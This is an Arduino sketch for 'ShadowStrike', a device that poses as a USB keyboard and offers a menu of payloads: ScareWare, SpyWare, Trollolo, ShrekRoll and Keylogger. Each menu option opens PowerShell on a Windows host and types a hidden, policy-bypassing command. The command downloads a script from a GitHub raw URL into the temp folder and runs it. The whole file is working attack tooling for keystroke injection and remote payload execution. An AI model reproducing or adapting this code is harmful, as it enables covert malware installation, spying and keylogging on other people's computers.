#include <Wire.h>
#include <rgb_lcd.h>
#include <HIDKeyboard.h>

HIDKeyboard keyboard;  // Initialize HIDKeyboard object
rgb_lcd lcd;

//////////////////////////////////
//  Joystick
#define JOYSTICK_Y 1
unsigned long delayValue = 0;

//////////////////////////////////
//  Button
#define BUTTON 12
bool lastState = HIGH;

//////////////////////////////////
//  Menu
#define MAXMENU 5
String menu[] = { "  ShadowStrike", "ScareWare", "SpyWare", "Trollolo", "ShrekRoll", "Keylogger" };
byte currentItem = 0;

//////////////////////////////////
//  Chars spéciaux
byte e_aigu[8] = {
  0b00010,
  0b00100,
  0b01110,
  0b10001,
  0b11111,
  0b10000,
  0b01110,
  0b00000
};

uint8_t buf[8] = { 0 };


void setup(void) {

  pinMode(JOYSTICK_Y, INPUT);
  pinMode(BUTTON, INPUT_PULLUP);
  lcd.begin(16, 2);
  lcd.createChar(0, e_aigu);

  displayItems();

  keyboard.begin();  // Start communication
  delay(200);


}

void loop(void) {

  joystickMvt();
  buttonChk();
  
}

void joystickMvt(void) {

  int yPosition = analogRead(JOYSTICK_Y);

  if (millis() - delayValue >= 250) {
    if (yPosition > 1000) {
      currentItem = (currentItem + 1 > MAXMENU) ? 0 : currentItem + 1;
      displayItems();
    } else if (yPosition < 250) {
      currentItem = (currentItem - 1 < 0) ? MAXMENU : currentItem - 1;
      displayItems();
    }
    delayValue = millis();
  }
}

byte buttonChk(void) {

  bool currentState = digitalRead(BUTTON);

  if (!currentState && lastState && currentItem) {
    lcd.setRGB(0, 255, 0);
    lcd.setCursor(0, 1);
    lcd.print("Valid");
    lcd.write(byte(0));
    lcd.print("!");
    delay(1000);
    menuSelection();
  }

  lastState = currentState;

}

void menuSelection(void) {

  switch (currentItem) {
    case 1:
      lcd.setRGB(255, 0, 255);
      script(1);
      break;
    case 2:
      lcd.setRGB(0, 255, 255);
      script(2);
      break;
    case 3:
      lcd.setRGB(0, 0, 255);
      script(3);
      break;
    case 4:
      lcd.setRGB(0, 75, 0);
      script(4);
      break;
    case 5:
      lcd.setRGB(0, 75, 0);
      script(5);
      break;
  }
}

void displayItems(void) {

  lcd.clear();
  lcd.setCursor(0, 0);
  lcd.setRGB(255, 255, 255);
  lcd.print(menu[currentItem]);
}

void script(int choix) {

  switch (choix) {
    case 1:
      windterm();
      keyboard.print("powershell -NoP -NonI -W Hidden -Exec Bypass @(New-Object System.Net.WebClient).DownloadFile(");
      write(1);
      keyboard.print("https://raw.githubusercontent.com/TcLVG/ShadowStrike/Elohyrr-patch-2/script1.txt");
      finprog();
      break;
    case 2:
      windterm();
      keyboard.print("powershell -NoP -NonI -W Hidden -Exec Bypass @(New-Object System.Net.WebClient).DownloadFile(");
      write(1);
      keyboard.print("https://raw.githubusercontent.com/TcLVG/ShadowStrike/Elohyrr-patch-2/script5.bat");
      finprog();
      break;
    case 3:
      windterm();
      keyboard.print("powershell -NoP -NonI -W Hidden -Exec Bypass @(New-Object System.Net.WebClient).DownloadFile(");
      write(1);
      keyboard.print("https://raw.githubusercontent.com/TcLVG/ShadowStrike/Elohyrr-patch-2/script7.bat");
      finprog();
      break;
    case 4:
      windterm();
      keyboard.print("powershell -NoP -NonI -W Hidden -Exec Bypass @(New-Object System.Net.WebClient).DownloadFile(");
      write(1);
      keyboard.print("https://raw.githubusercontent.com/TcLVG/ShadowStrike/Elohyrr-patch-2/script8.bat");
      finprog();
      break;
    case 5:
      windterm();
      keyboard.print("powershell -NoP -NonI -W Hidden -Exec Bypass @(New-Object System.Net.WebClient).DownloadFile(");
      write(1);
      keyboard.print("https://raw.githubusercontent.com/TcLVG/ShadowStrike/Elohyrr-patch-2/script6.ps1");
      finprog2();
      break;
  }
}

void write(int choix) {
  if (choix == 1) {        //pour un '
    buf[2] = 0x34;         // ' key
    Serial.write(buf, 8);  // Send keypress
    keyboard.releaseKey();
  } else if (choix == 2) {  // pour une ,
    buf[2] = 0x36;          // , key
    Serial.write(buf, 8);   // Send keypress
    keyboard.releaseKey();
  } else if (choix == 3) {  //pour un "\"
    buf[2] = 0x64;          // \ key
    Serial.write(buf, 8);   // Send keypress
    keyboard.releaseKey();
  }
}

void windterm() {
  delay(10);
  keyboard.pressSpecialKey(GUI);  // Press the GUI (Windows) key
  keyboard.releaseKey();          // Release the GUI key

  delay(1000);
  keyboard.print("powershell");
  delay(1000);
  keyboard.pressSpecialKey(ENTER);
  delay(100);
  keyboard.releaseKey();
  delay(2500);
}

void finprog() {
  write(1);
  write(2);
  keyboard.pressKey(' ');
  keyboard.releaseKey();
  write(1);
  keyboard.print("$env:temp");
  write(3);
  keyboard.print("testscript.bat");
  write(1);
  keyboard.print("); Start-Process ");
  write(1);
  keyboard.print("cmd");
  write(1);
  keyboard.print(" -ArgumentList ");
  write(1);
  keyboard.print("/c");
  write(1);
  write(2);
  write(1);
  keyboard.print("$env:temp");
  write(3);
  keyboard.print("testscript.bat");
  write(1);
  keyboard.pressKey('@');  // le @ donne un "


  keyboard.pressSpecialKey(ENTER);
  keyboard.releaseKey();
}

void finprog2() {
  write(1);
  write(2);
  keyboard.pressKey(' ');
  keyboard.releaseKey();
  write(1);
  keyboard.print("$env:temp");
  write(3);
  keyboard.print("testscript.ps1");
  write(1);
  keyboard.print("); Start-Process ");
  write(1);
  keyboard.print("cmd");
  write(1);
  keyboard.print(" -ArgumentList ");
  write(1);
  keyboard.print("/c");
  write(1);
  write(2);
  write(1);
  keyboard.print("$env:temp");
  write(3);
  keyboard.print("testscript.ps1");
  write(1);
  keyboard.pressKey('@');  // le @ donne un "


  keyboard.pressSpecialKey(ENTER);
  keyboard.releaseKey();
}